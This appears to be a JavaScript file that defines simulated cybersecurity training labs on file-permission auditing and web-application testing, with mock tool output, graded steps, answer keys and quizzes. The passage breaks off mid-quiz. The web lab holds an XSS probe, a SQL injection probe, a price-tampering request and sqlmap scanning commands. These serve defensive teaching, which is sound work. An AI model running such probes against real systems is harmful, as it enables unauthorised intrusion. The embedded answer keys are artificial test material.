// ============================================================
//  Security Assessments Track — Labs (Agent 05)
// ============================================================
//  sa-2  File System Security
//  sa-3  Web Application Security  (BurpProxyLabShell)
//  sa-4  System Log Assessment
//  sa-5  User Account Security  (IamMatrixLabShell)
//
//  Shells defined in src/shells/security-assessments-shells.jsx.
//  Bash builtins extended there with realistic stubs (nmap, nikto,
//  faillog, getfacl, …).
// ============================================================

(function () {
  // ────────────────────────────────────────────────────────────
  //  sa-2  File System Security
  // ────────────────────────────────────────────────────────────
  // Host: FILESRV-01 — Debian/Ubuntu file server (apt, aideinit, auditd).
  const SA2_HOST = 'FILESRV-01.corp.example.local';

  const SA2_AIDE = [
    'Start timestamp: 2026-04-23 15:14:11 -0400 (AIDE 0.17.4)',
    'AIDE found differences between database and filesystem!!',
    '',
    'Summary:',
    '  Total number of entries:      24811',
    '  Added entries:                1',
    '  Removed entries:              0',
    '  Changed entries:              2',
    '',
    '---------------------------------------------------',
    'Added entries:',
    '---------------------------------------------------',
    '',
    'f++++++++++++++++: /srv/share/finance/wages-2025-Q4.xlsx',
    '',
    '---------------------------------------------------',
    'Changed entries:',
    '---------------------------------------------------',
    '',
    'f   ...    .C... : /etc/passwd',
    'f   ...    .C... : /etc/sudoers',
    '',
    '---------------------------------------------------',
    'Detailed information about changes:',
    '---------------------------------------------------',
    '',
    'File: /etc/passwd',
    '  SHA256    : 3yq1Qm0k2dH8bJp4Tf6uV1c9eXwZrN7sL5aG0oPiKjM= | 9Rt2Lw6yXc1bVn8mQp3sDf5gHj7kLz0aSe4rTu6iOpA=',
    '',
    'File: /etc/sudoers',
    '  SHA256    : Ab4cD8eF1gH5iJ9kL2mN6oP0qR3sT7uV1wX5yZ9aB2c= | Zx8cV4bN1mQ6wE3rT9yU5iO2pA7sD0fG4hJ8kL1zX6c=',
    '',
    'End timestamp: 2026-04-23 15:14:39 -0400 (run time: 0m 28s)',
  ].join('\n') + '\n';

  // Frozen image output. bindshell on 465/tcp is chkrootkit's best-known
  // false positive (SMTPS listener) — gives a deterministic graded answer.
  const SA2_CHKROOT = [
    'ROOTDIR is `/\'',
    'Checking `amd\'...                                          not found',
    'Checking `chsh\'...                                         not infected',
    'Checking `cron\'...                                         not infected',
    'Checking `crontab\'...                                      not infected',
    'Checking `ifconfig\'...                                     not infected',
    'Checking `lsof\'...                                         not infected',
    'Checking `netstat\'...                                      not infected',
    'Checking `passwd\'...                                       not infected',
    'Checking `sshd\'...                                         not infected',
    'Checking `bindshell\'...                                    INFECTED (PORTS:  465)',
    'Checking `lkm\'...                                          chkproc: nothing detected',
    'Checking `rexedcs\'...                                      not found',
    'Checking `sniffer\'...                                      lo: not promisc and no packet sniffer sockets',
    'Checking `wted\'...                                         chkwtmp: nothing deleted',
    'Checking `z2\'...                                           chklastlog: nothing deleted',
  ].join('\n') + '\n';

  function buildSa2Fs() {
    const finFile = (content) => ({ __file: true, content, mode: '0777', owner: 'root', group: 'finance' });
    return {
      'home': { 'student': { '.bashrc': 'alias ll="ls -la"\n' } },
      'srv': {
        'share': {
          'finance': {
            __mode: '0777', __owner: 'root', __group: 'finance',
            'wages-2025-Q4.xlsx': finFile('binary xlsx'),
            'tax-form-W2-jsanders.pdf': finFile('binary pdf'),
            'ap-vendor-banking.csv': finFile('vendor,routing,account\n'),
          },
          'public': {
            'README.txt': 'Public read-only share.\n',
          },
        },
      },
      'etc': {
        'hostname': 'FILESRV-01\n',
        'os-release': 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nID=ubuntu\nID_LIKE=debian\n',
        'passwd': 'root:x:0:0:root:/root:/bin/bash\nj.sanders:x:1001:1001::/home/j.sanders:/bin/bash\nm.chen:x:1002:1002::/home/m.chen:/bin/bash\nsvc_backup:x:1003:1003::/var/lib/backup:/bin/false\ntemp.contractor:x:1099:1099::/home/temp.contractor:/bin/bash\n',
        'sudoers': '# /etc/sudoers\nroot ALL=(ALL:ALL) ALL\nhelpdesk-admin ALL=(ALL) NOPASSWD: /usr/bin/systemctl\ntemp.contractor ALL=(ALL) NOPASSWD: ALL\n',
        'aide': { 'aide.conf': '# /etc/aide/aide.conf (Debian default)\ndatabase_in=file:/var/lib/aide/aide.db\ndatabase_out=file:/var/lib/aide/aide.db.new\n' },
        'audit': { 'rules.d': { '_b2b.rules': '' } },
      },
      'var': {
        'lib': {
          'sa': {
            'aide-check.txt':      SA2_AIDE,
            'chkrootkit-report.txt': SA2_CHKROOT,
            'ss.txt': [
              'State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process',
              'LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=812,fd=3))',
              'LISTEN 0      50           0.0.0.0:445        0.0.0.0:*     users:(("smbd",pid=1044,fd=46))',
              'LISTEN 0      100          0.0.0.0:465        0.0.0.0:*     users:(("master",pid=1290,fd=18))',
            ].join('\n') + '\n',
            'ausearch-passwd.txt':
              '----\ntime->Thu Apr 23 14:41:09 2026\ntype=PATH msg=audit(1745423469.118:412): item=0 name="/etc/passwd" inode=786433 dev=08:01 mode=0100644 ouid=0 ogid=0\ntype=SYSCALL msg=audit(1745423469.118:412): arch=c000003e syscall=257 success=yes exit=4 comm="vi" exe="/usr/bin/vi" key="passwd_changes"\n',
          },
          // Empty until aideinit runs; aide --check needs aide.db promoted from aide.db.new.
          'aide': {},
        },
        'log': {},
      },
      'tmp': {},
    };
  }

  const SA2_LAB = {
    id: 'sa-2',
    track: 'security-assessments',
    title: 'File System Security Assessment',
    difficulty: 'Beginner',
    estimatedTime: '40 min',
    icon: '🗂',
    tags: ['Permissions', 'ACLs', 'Auditd', 'AIDE', 'chkrootkit'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-2-File System Security Assessment.md',
      sha256: '261c60ac55c3739e3721cab757410fad4d646956c80ae145f5eee6e9329c54c9',
      snapshot: 'src/data/sources/sa-2.source.md',
    },

    environment: { type: 'linux', shell: 'LinuxTerminalShell', fs: buildSa2Fs, host: 'filesrv-01' },

    scenario: {
      role: 'SOC analyst on the host-integrity rotation',
      incident: 'An internal audit flagged the finance share (`/srv/share/finance`) on ' + SA2_HOST + ' (Ubuntu 22.04 file server) as potentially world-readable. Verify and fix the share permissions, put file-access monitoring in place, baseline file integrity, and check for rootkit indicators.',
    },

    exercises: [
      {
        id: 'ex0',
        upstreamHeading: 'Exercise 1: Verify and Fix the Finance Share Permissions',
        steps: [
          {
            id: 'sa-2.ex0.s1',
            upstream: { exercise: 'Scenario task', stepNumber: 1, sourceLine: 'ls -l /srv/share/finance' },
            kind: 'command',
            instruction: 'List the finance share with long-format permissions and look at the mode bits on each file.',
            hint: '`ls -l /srv/share/finance` (add `-d` to see the directory itself)',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?ls\s+-(l|ld|dl|la|al|lad)\s+\/srv\/share\/finance\/?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex0.s2',
            upstream: { exercise: 'Scenario task', stepNumber: 2, sourceLine: 'getfacl /srv/share/finance' },
            kind: 'analyze',
            instruction: 'Run getfacl on /srv/share/finance. What permissions does "other" (everyone else on the box) have? Submit the other:: line exactly as shown.',
            hint: '`getfacl /srv/share/finance` — the last line starts with `other::`.',
            validation: { type: 'valueExtracted', expected: ['other::rwx'] },
            points: 10,
            checkOnLearning: 'sa2-q0',
          },
          {
            id: 'sa-2.ex0.s3',
            upstream: { exercise: 'Scenario task', stepNumber: 3, sourceLine: 'chmod -R o-rwx /srv/share/finance' },
            kind: 'command',
            instruction: 'Remove all access for "other" on the share and everything inside it. Owner and the finance group keep their access.',
            hint: '`sudo chmod -R o-rwx /srv/share/finance` (or `sudo setfacl -R -m o::--- /srv/share/finance`)',
            acceptedInputs: [
              { type: 'regex', value: /^(sudo\s+)?chmod\s+-R\s+(o-rwx|o=|o=---|0?7[57]0)\s+\/srv\/share\/finance\/?\s*$/ },
              { type: 'regex', value: /^(sudo\s+)?setfacl\s+-R\s+-m\s+o::---\s+\/srv\/share\/finance\/?\s*$/ },
            ],
            validation: { type: 'commandExecuted' },
            points: 10,
          },
          {
            id: 'sa-2.ex0.s4',
            upstream: { exercise: 'Scenario task', stepNumber: 4, sourceLine: 'getfacl /srv/share/finance' },
            kind: 'analyze',
            instruction: 'Verify the fix: run getfacl on the share again and submit the new other:: line.',
            hint: 'If it still shows rwx, your chmod/setfacl did not apply — re-run it with -R against /srv/share/finance.',
            validation: { type: 'valueExtracted', expected: ['other::---'] },
            points: 10,
          },
        ],
      },
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 2: Monitoring File Access with Auditd',
        steps: [
          {
            id: 'sa-2.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install auditd' },
            kind: 'command',
            instruction: 'Install Auditd.',
            hint: '`sudo apt-get install auditd`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?auditd\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'sudo auditctl -w /etc/passwd -p wa -k passwd_changes' },
            kind: 'command',
            instruction: 'Watch /etc/passwd for write/attribute-change operations and tag them with the key passwd_changes.',
            hint: '`sudo auditctl -w /etc/passwd -p wa -k passwd_changes`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?auditctl\s+-w\s+\/etc\/passwd\s+-p\s+wa\s+-k\s+passwd_changes\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa2-q1',
          },
          {
            id: 'sa-2.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'sudo ausearch -k passwd_changes' },
            kind: 'command',
            instruction: 'Read back any audit events tagged passwd_changes.',
            hint: '`sudo ausearch -k passwd_changes`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?ausearch\s+-k\s+passwd_changes\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: File Integrity Baseline with AIDE',
        steps: [
          {
            id: 'sa-2.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo apt-get install aide' },
            kind: 'command',
            instruction: 'Install AIDE.',
            hint: '`sudo apt-get install aide`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?aide\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo aideinit' },
            kind: 'command',
            instruction: 'Build the AIDE baseline with the Debian/Ubuntu wrapper. Note where it writes the new database.',
            hint: '`sudo aideinit`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?aideinit\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex3.s2a',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db' },
            kind: 'command',
            instruction: 'aideinit wrote the baseline to aide.db.new, but aide --check reads aide.db. Promote the new database so the check has something to compare against.',
            hint: '`sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?(cp|mv)\s+\/var\/lib\/aide\/aide\.db\.new\s+\/var\/lib\/aide\/aide\.db\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex3.s3',
            upstream: { exercise: 'Exercise 3', stepNumber: 3, sourceLine: 'sudo aide --check' },
            kind: 'analyze',
            instruction: 'Run an AIDE check. Two files under /etc show content changes — submit the path of the one that grants privilege escalation (the most urgent finding).',
            hint: '`sudo aide --config /etc/aide/aide.conf --check`, then look under "Changed entries" and cat each file.',
            validation: { type: 'valueExtracted', expected: ['/etc/sudoers'] },
            points: 15,
            checkOnLearning: 'sa2-q3',
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 4: Rootkit Detection with Chkrootkit',
        steps: [
          {
            id: 'sa-2.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install chkrootkit' },
            kind: 'command',
            instruction: 'Install chkrootkit.',
            hint: '`sudo apt-get install chkrootkit`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?chkrootkit\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'sudo chkrootkit' },
            kind: 'analyze',
            instruction: 'Run chkrootkit. Which check, if any, reports a warning? Submit the check name (or "none").',
            hint: 'Scan for any line that does not say "not infected", "not found" or "nothing detected/deleted".',
            validation: { type: 'valueExtracted', expected: ['bindshell', '`bindshell\''] },
            points: 10,
            checkOnLearning: 'sa2-q4',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa2-q0',
        bloom: 'comprehension',
        question: 'The finance share shows other::rwx. What does that mean on a multi-user file server?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Only root and the finance group can read the files', correct: false },
          { id: 'b', text: 'Any local account can read, modify, or delete the payroll files', correct: true },
          { id: 'c', text: 'Only users logged in over SMB can reach the files', correct: false },
          { id: 'd', text: 'Nothing — the ACL overrides the mode bits', correct: false },
        ],
        triggerOn: { stepId: 'sa-2.ex0.s2' },
        reinforces: 'sa-2.ex0.s2',
      },
      {
        id: 'sa2-q1',
        bloom: 'recall',
        question: 'In auditctl -w /etc/passwd -p wa -k passwd_changes, what does the wa indicate?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Watch attribute changes only', correct: false },
          { id: 'b', text: 'Watch writes and attribute changes', correct: true },
          { id: 'c', text: 'Watch all reads', correct: false },
          { id: 'd', text: 'Web access', correct: false },
        ],
        triggerOn: { stepId: 'sa-2.ex1.s2' },
        reinforces: 'sa-2.ex1.s2',
      },
      {
        id: 'sa2-q3',
        bloom: 'application',
        question: 'In the AIDE output, the .C... flag column on a changed entry means…',
        type: 'short-answer',
        acceptedAnswer: [/content/i, 'Content', 'content'],
        triggerOn: { stepId: 'sa-2.ex3.s3' },
        reinforces: 'sa-2.ex3.s3',
      },
      {
        id: 'sa2-q4',
        bloom: 'analysis',
        question: 'chkrootkit flagged bindshell INFECTED (PORTS: 465). Pick every reasonable next step or conclusion.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'Check what is listening on 465 (ss -tlnp) — an SMTPS listener is a well-known false positive', correct: true },
          { id: 'b', text: 'The host is confirmed rootkitted; wipe it immediately', correct: false },
          { id: 'c', text: 'Corroborate with a second scanner (e.g. rkhunter) before drawing a conclusion', correct: true },
          { id: 'd', text: 'A clean chkrootkit run would not rule out kernel-level rootkits or custom implants', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-2.ex5.s2' },
        reinforces: 'sa-2.ex5.s2',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  sa-3  Web Application Security  (BurpProxyLabShell)
  // ────────────────────────────────────────────────────────────
  function buildSa3Burp() {
    // ~80 captured requests against https://app.example.local/
    const rows = [];
    let id = 1;
    function add(method, url, status, length, opts) {
      const o = opts || {};
      rows.push({
        id: 'r' + id++,
        method: method,
        url: url,
        hasParams: !!o.params,
        edited: false,
        status: status,
        length: length,
        mime: o.mime || 'HTML',
        title: o.title || '',
        tls: true,
        ip: '10.10.24.15',
        request: o.request || `${method} ${url} HTTP/1.1\nHost: app.example.local\nUser-Agent: Mozilla/5.0\nCookie: PHPSESSID=8f3a1c\nAccept: */*\n\n`,
        response: o.response || `HTTP/1.1 ${status} OK\nContent-Type: text/html; charset=utf-8\nContent-Length: ${length}\n\n<html>...${status === 200 ? 'OK' : 'response'}...</html>\n`,
      });
    }

    // Browse: home, login, dashboard, products
    add('GET', '/',                      200, 4128, { title: 'app.example — home' });
    add('GET', '/static/css/main.css',   200, 1284, { mime: 'CSS' });
    add('GET', '/static/js/app.js',      304, 0,    { mime: 'JS' });
    add('GET', '/login',                 200, 3214, { title: 'Login' });
    add('POST', '/login',                302, 0,    { params: true, title: 'redirect /dashboard',
      request: 'POST /login HTTP/1.1\nHost: app.example.local\nContent-Type: application/x-www-form-urlencoded\n\nusername=j.sanders&password=Spring2026!\n',
      response: 'HTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: PHPSESSID=8f3a1c; Path=/\n\n' });
    add('GET', '/dashboard',             200, 5921, { title: 'Dashboard' });
    add('GET', '/api/users/me',          200, 612,  { mime: 'JSON',
      response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":1001,"username":"j.sanders","role":"customer"}\n' });
    add('GET', '/products',              200, 8244, { title: 'Catalog' });
    for (let i = 1; i <= 12; i++) {
      add('GET', `/products/${i}`, 200, 4100 + i*7, { title: `Product ${i}` });
    }
    add('GET', '/cart',                  200, 2918, { title: 'Cart' });
    add('POST', '/cart/add',             200, 412,  { params: true, mime: 'JSON',
      request: 'POST /cart/add HTTP/1.1\nHost: app.example.local\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=8f3a1c\n\nproduct_id=4&quantity=1&price=199.00\n',
      response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"ok":true,"cartTotal":199.00,"items":1}\n',
      responseManipulated: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"ok":true,"cartTotal":1.00,"items":1}\n' });
    add('GET', '/cart',                  200, 3104, { title: 'Cart (1 item)' });
    add('POST', '/checkout',             302, 0,    { params: true, title: 'redirect /thanks',
      response: 'HTTP/1.1 302 Found\nLocation: /thanks\n\n' });

    // Reflected XSS: /search?q=
    add('GET', '/search?q=phone',                 200, 4118, { params: true, title: 'Search results' });
    add('GET', '/search?q=<script>alert(1)<\/script>', 200, 4218, { params: true, title: 'Search results',
      response: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h2>Results for: <script>alert(1)</script></h2>...\n' });

    // Admin probes (404)
    add('GET', '/admin',     404, 287, { title: 'Not Found' });
    add('GET', '/admin/',    404, 289, { title: 'Not Found' });
    add('GET', '/.git/HEAD', 404, 285, { title: 'Not Found' });
    add('GET', '/.env',      404, 281, { title: 'Not Found' });

    // SQLi indicator
    add('GET', "/products?id=1'", 500, 612, { params: true, title: 'Internal Server Error',
      response: 'HTTP/1.1 500 Internal Server Error\nContent-Type: text/html\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'\' at line 1\n' });

    // Misc noise to round out ~80
    for (let i = 0; i < 50; i++) {
      add('GET', `/api/products?cat=${i}`, 200, 1024 + i, { params: true, mime: 'JSON' });
    }

    return JSON.stringify(rows);
  }

  function buildSa3Fs() {
    return {
      'home': { 'student': { '.bashrc': '' } },
      'var': {
        'lib': {
          'burp': {
            'http-history.json': buildSa3Burp(),
            'project-config.json': '{"proxy":{"port":8080,"host":"127.0.0.1"}}\n',
          },
          'sa': {
            'sqlmap-results.txt': 'GET parameter \'id\' is injectable.\n',
          },
        },
        'log': {},
      },
      'tmp': {},
    };
  }

  const SA3_LAB = {
    id: 'sa-3',
    track: 'security-assessments',
    title: 'Web Application Security Assessment',
    difficulty: 'Intermediate',
    estimatedTime: '60 min',
    icon: '🕸',
    tags: ['Burp Suite', 'OWASP ZAP', 'Web', 'IDOR', 'XSS', 'SQLi'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-3-Web Application Security Assessment.md',
      sha256: '4e087898c76325c95d7e96122ace7d3d83b9262e97c96e54b0b58aa8eb1fa895',
      snapshot: 'src/data/sources/sa-3.source.md',
    },

    environment: { type: 'web', shell: 'BurpProxyLabShell', fs: buildSa3Fs },

    scenario: {
      role: 'AppSec analyst on the e-commerce rotation',
      incident: 'Customer reports show inconsistent prices appearing in completed orders for app.example.local. You have a captured proxy session from the testing environment. Use it to identify the class of vulnerability that allows price manipulation, and verify two other web findings flagged by automated tooling.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Intercepting Traffic with OWASP ZAP',
        steps: [
          {
            id: 'sa-3.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install zaproxy' },
            kind: 'observe',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: '(Aside) ZAP is the open-source equivalent of Burp. The upstream begins with installing zaproxy. Confirm you have a terminal by pressing Enter on a blank line.',
            acceptedInputs: [{ type: 'regex', value: /^\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Configure browser to use ZAP proxy 127.0.0.1:8080' },
            kind: 'ui',
            instruction: 'In Burp (left), open the Proxy listener: click "Open browser" in the Proxy toolbar to point a sandboxed browser at 127.0.0.1:8080.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'listener:8080'] },
            points: 5,
          },
          {
            id: 'sa-3.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'Navigate the web app and observe intercepted requests' },
            kind: 'ui',
            instruction: 'In the HTTP history, click the row that shows POST /cart/add to inspect the captured request and response panes.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'history'] },
            points: 10,
            checkOnLearning: 'sa3-q1',
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: Vulnerability Scanning with Burp Suite',
        steps: [
          {
            id: 'sa-3.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install burpsuite' },
            kind: 'ui',
            instruction: 'Burp is already running. The title bar reads "Burp Suite Professional v2024.4". Confirm by clicking the Proxy tab.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'listener:8080'] },
            points: 5,
          },
          {
            id: 'sa-3.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'Configure browser to use Burp proxy 127.0.0.1:8080' },
            kind: 'ui',
            instruction: 'Toggle "Intercept is off" → "Intercept is ON" so the next request can be modified before it leaves the browser.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'intercept'] },
            points: 5,
          },
          {
            id: 'sa-3.ex2.s3',
            upstream: { exercise: 'Exercise 2', stepNumber: 3, sourceLine: 'Right-click → Send to Repeater; modify and re-send' },
            kind: 'ui',
            instruction: 'Right-click the POST /cart/add row in HTTP history → "Send to Repeater". In Repeater, change `price=199.00` to `price=1` and click Send. Confirm the manipulated response shows cartTotal=1.00.',
            validation: { type: 'uiPath', expected: ['burp', 'send-to-repeater'] },
            points: 25,
            checkOnLearning: 'sa3-q2',
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: Web Server Assessment with Nikto',
        steps: [
          {
            id: 'sa-3.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo apt-get install nikto' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Switch to a terminal and install Nikto.',
            hint: '`sudo apt-get install nikto`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?nikto\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'nikto -h http://192.168.1.10' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Scan https://app.example.local with Nikto.',
            hint: '`nikto -h https://app.example.local`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?nikto\s+-h\s+https?:\/\/app\.example\.local\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa3-q5',
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: SQL Injection Testing with SQLMap',
        steps: [
          {
            id: 'sa-3.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'sudo apt-get install sqlmap' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Install SQLMap.',
            hint: '`sudo apt-get install sqlmap`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?sqlmap\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'Identify a vulnerable parameter (e.g., /index.php?id=1)' },
            kind: 'analyze',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'In your captured proxy traffic, which endpoint produced a 500 error after appending a single quote (the classic SQLi indicator)? Submit the path with parameter, e.g. /foo?bar=1.',
            hint: 'Look for the row in your Burp HTTP history with status 500 and a "syntax error" body. The URL ended with `\'`.',
            validation: { type: 'valueExtracted', expected: ["/products?id=1'", '/products?id=1', '/products', '/products?id'] },
            points: 15,
            checkOnLearning: 'sa3-q3',
          },
          {
            id: 'sa-3.ex4.s3',
            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'sqlmap -u "http://.../index.php?id=1" --batch --dbs' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Run sqlmap against the suspicious parameter.',
            hint: '`sqlmap -u "https://app.example.local/products?id=1" --batch --dbs`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?sqlmap\s+-u\s+["']?https?:\/\/app\.example\.local\/products\?id=1["']?(\s+--batch)?(\s+--dbs)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 15,
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Web Application Fuzzing with Wapiti',
        steps: [
          {
            id: 'sa-3.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install wapiti' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Install Wapiti.',
            hint: '`sudo apt-get install wapiti`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?wapiti\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'wapiti http://192.168.1.10 -f txt -o wapiti_report.txt' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Fuzz https://app.example.local and write a text report.',
            hint: '`wapiti https://app.example.local -f txt -o wapiti_report.txt`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?wapiti\s+https?:\/\/app\.example\.local(\s+-f\s+\w+)?(\s+-o\s+\S+)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa3-q4',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa3-q1',
        bloom: 'recall',
        question: 'In the captured POST /cart/add request, which body parameter directly controls the per-item price the server records?',
        type: 'short-answer',
        acceptedAnswer: ['price', 'price='],
        triggerOn: { stepId: 'sa-3.ex1.s3' },
        reinforces: 'sa-3.ex1.s3',
      },
      {
        id: 'sa3-q2',
        bloom: 'application',
        question: 'You sent the request with price=1 in Repeater and the server returned cartTotal=1.00. What class of OWASP finding is this?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Cross-Site Scripting (XSS)', correct: false },
          { id: 'b', text: 'SQL Injection', correct: false },
          { id: 'c', text: 'Insecure Direct Object Reference / Broken Access Control (parameter tampering on price)', correct: true },
          { id: 'd', text: 'CSRF', correct: false },
        ],
        triggerOn: { stepId: 'sa-3.ex2.s3' },
        reinforces: 'sa-3.ex2.s3',
      },
      {
        id: 'sa3-q3',
        bloom: 'comprehension',
        question: 'A request to /products?id=1\' returned an error message disclosing MySQL syntax. What does that primarily indicate?',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'The id parameter is concatenated unsafely into a SQL query', correct: true },
          { id: 'b', text: 'Stack traces are leaking back-end DBMS information', correct: true },
          { id: 'c', text: 'The endpoint is using parameterized queries correctly', correct: false },
          { id: 'd', text: 'sqlmap can likely exploit this further', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-3.ex4.s2' },
        reinforces: 'sa-3.ex4.s2',
      },
      {
        id: 'sa3-q4',
        bloom: 'analysis',
        question: 'You have evidence of price-tampering IDOR, an open SQLi indicator on /products, and a reflected XSS on /search. Pick every reasonable next-day action.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'File the IDOR as critical and ask app owners to enforce server-side price validation against the catalog', correct: true },
          { id: 'b', text: 'Disable the public site without notifying stakeholders', correct: false },
          { id: 'c', text: 'Confirm the SQLi locally then file with safe PoC, do not exfiltrate', correct: true },
          { id: 'd', text: 'Capture the XSS payload context (URL + sink) for the dev team', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-3.ex5.s2' },
        reinforces: 'sa-3.ex5.s2',
      },
      {
        id: 'sa3-q5',
        bloom: 'comprehension',
